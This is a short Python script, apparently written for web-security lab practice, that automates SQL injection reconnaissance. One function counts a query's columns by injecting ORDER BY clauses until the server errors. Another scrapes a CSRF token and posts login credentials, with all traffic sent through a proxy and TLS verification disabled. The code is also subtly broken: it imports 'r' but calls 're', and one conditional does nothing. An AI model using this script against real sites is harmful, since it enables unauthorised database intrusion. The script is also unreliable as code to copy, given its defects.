from proxies import proxies
import r

# Determine the amount of columns using order-by clauses
def sqli_count_columns(session, url):
    errored = False
    col_count = 0
    while not errored:
        if col_count >= 50:
            print("[!] Error with script")
            return False
        uri = url + "'+order+by+{}--".format(col_count + 1)
        res = session.get(uri, verify=False, proxies=proxies)
        print("[~] Status Code: " + str(res.status_code) + ". \n[~] URL: " + uri)
        if res.status_code in [500, 504]:
            errored = True
        else:
            col_count = col_count + 1

    print("[+] Column count: " + str(col_count))

    return col_count

def login_with_username_password(session, url, payload):
    login_path = "/login"
    setup_request = session.get(url + login_path, verify=False, proxies=proxies)
    csrf_token = (re.search('name="csrf" value="(.*)">', setup_request.text).group(1) if True else False)
    print("[+] CSRF Token Found: " + csrf_token)
    if csrf_token:
        payload["csrf"] = csrf_token
        login_result = session.post(url + login_path, data=payload, verify=False, proxies=proxies)
        return login_result
